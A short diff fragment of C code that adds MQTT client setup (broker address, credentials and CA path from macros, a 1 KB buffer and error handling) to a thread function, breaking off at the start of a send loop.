@@ -140,3 +140,16 @@ void thread_main_payload_launch(void * arg){
 	const char * password = PASSWORD;
 	const char * topic = TOPIC;
 	const char * capath = CAPATH;
+
+	const size_t BLOCK_SIZE = 0x400;
+
+	size_t len = 0;
+	unsigned char buf[BLOCK_SIZE];
+
+	rc = mqttsender_init(&client, addr, clientid, username, password, capath);
+	if(rc < 0){
+		printf("Failed to initialize, return code %d\n", rc);
+		goto e_cleanup;
+	}
+
+	while(1){
